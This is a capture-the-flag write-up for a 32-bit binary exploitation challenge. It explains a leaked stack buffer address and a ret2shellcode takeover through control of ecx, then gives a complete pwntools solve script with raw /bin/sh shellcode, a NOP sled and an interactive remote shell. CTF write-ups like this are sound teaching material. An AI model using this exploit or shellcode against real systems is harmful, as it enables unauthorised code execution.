## Pwn/MorseCode Encoder

### Initial Analysis

![image](https://github.com/user-attachments/assets/75fea0e5-d9df-44c0-a4ff-e240702dae63)

All of the security protections have been turned off (except ASLR of course).

![image](https://github.com/user-attachments/assets/630985d6-ce73-4b4a-b719-ad06f6062481)

When running the binary, we can see that it leaks out the address of our buffer, which is located in the stack memory region. The challenge is screaming ret2shellcode since we are given the address of the buffer and NX (No eXecute) protection is turned off. NX is a protection which prevents execution of shellcode in the stack. So, the basic idea is to inject shellcode into the buffer and overwrite the saved return address to point to our shellcode.

![image](https://github.com/user-attachments/assets/b1ceda87-4725-4f2f-8790-e51fc736bb5b)

However, when you overwrite the values which are popped into ecx, ebx and ebp, it will affect where the return goes to due to `lea esp, [ecx-0x4]`. So, we need to control the value of ecx since it will be moved into esp and control our return address.

![image](https://github.com/user-attachments/assets/0c379971-a400-413b-97bc-604b0818d413)

Just 12 bytes below our input, there is a pointer to our buffer. So, that will be our target. Now, we just need a shellcode. You can use msfvenom, shellcraft or find it online. I used shellcode from https://shell-storm.org/shellcode/files/shellcode-811.html

### Solve Script

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./morse-converter')
libc = exe.libc

host = "morsecode-encoder.ihack24.capturextheflag.io"
port = 1337

gdb_script = '''
b *main+141
c
'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

# p = exe.process()
p = remote(host,port)
# p = gdb.debug('./morse-converter', gdbscript = gdb_script)

offset = 1024

sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

ru(b"address: ")
leak = int(r(10), 16)
print(hex(leak))
tar = leak - 0x10
print(hex(tar))

payload = sc.rjust(1024, b"\x90")
payload += p32(tar+8) * 10

print(payload)

sla(b"Enter]: ", payload)

p.interactive()
```
